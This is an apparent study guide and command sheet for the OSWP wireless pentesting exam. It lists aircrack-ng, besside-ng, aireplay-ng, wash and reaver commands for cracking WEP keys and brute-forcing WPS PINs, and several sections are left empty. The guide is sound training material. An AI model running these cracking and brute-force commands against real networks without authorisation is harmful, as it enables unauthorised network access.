# OSWP-Study-Guide
Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)

## WEP (Wired Equivalent Privacy)
WEP is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:


### Step 1: Kill conflicting processes
```bash
sudo airmon-ng check kill
```
### Step 2: Start monitor mode on wlan0
```bash
sudo airmon-ng start wlan0
```
### Step 3: Scan for WEP networks
```bash
sudo airodump-ng wlan0mon --encrypt WEP
```
### Step 4: Capture IVs
```bash
besside-ng -c Channel -b BSSID wlan0mon
```
### Step 5: Crack WEP key
```bash
aircrack-ng ./wep.cap
```

### Additional WEP Attacks:
[Hirte Attack](https://pentestlab.blog/2015/02/03/hirte-attack/)
[Caffe Latte Attck](https://www.computerworld.com/article/2539400/cafe-latte-attack-steals-data-from-wi-fi-users.html)

## WPS (Wi-Fi Protected Setup)
WPS was originally known as Wi-Fi Simple Configuration, aiming to unify vendor technologies for secure WPA/WPA2 passphrase sharing. However, it has its set of vulnerabilities. Below are the steps to identify and exploit WPS vulnerabilities:

### Identifying access points with WPS enabled
```bash
wash -i <INTERFACE> -s
```
### Fake authentication attack
```bash
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
```
### Offline brute force (pixie dust)
```bash
reaver -i wlan0 -b BSSID -SNLAvv  -c 1 -K
```
### Online brute force 
```bash
reaver -i <INTERFACE> -b <BSSID> -SNLAsvv -d 1 -r 5:3 -c <CHANNEL_NUMBER>
```

## WPA/WPA2/WPA3 Testing
Steps for testing security on networks with WPA/WPA2/WPA3 encryption, including setting up rogue APs and capturing handshakes:

## Rogue Access Points

## Definitions
- BSSID: Basic Service Set Identifier is a 48-bit number that follows MAC address conventions.
- ESSID: Extended Service Set Identifier is a unique identifier to avoid interference on a wireless network.

## Troubleshooting
- Make sure that hostapd-mana is installed on Kali. Default installations currently feature hostapd, hostapd-wpa and hostapd_cli. None of these frameworks feature the *mana_wpaout* section in the *hostapd-mana.config*, and will result in error: *unknown configuration item 'mana_wpaout'*
- When starting the exam, fist thing after connecting to the .ovpn is to test both **SSH** and **RDP** protocols to ensure connection works as intended.

## Sources

